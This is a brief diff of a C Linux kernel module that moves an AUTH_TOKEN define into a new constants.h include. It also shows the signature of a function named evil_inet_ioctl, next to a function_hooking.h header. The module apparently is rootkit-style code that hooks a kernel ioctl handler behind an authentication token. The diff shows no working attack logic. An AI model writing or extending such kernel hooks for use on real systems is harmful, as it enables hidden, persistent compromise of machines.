@@ -27,6 +27,7 @@
 #include <linux/kthread.h>
 #include <linux/keyboard.h>
 
+#include "constants.h"
 #include "function_hooking.h"
 
 //  Define the module metadata.
@@ -177,8 +178,6 @@ struct s_args
     unsigned short cmd;
     void *ptr;
 };
-
-#define AUTH_TOKEN 0xabcdef
 
 static long evil_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
 {
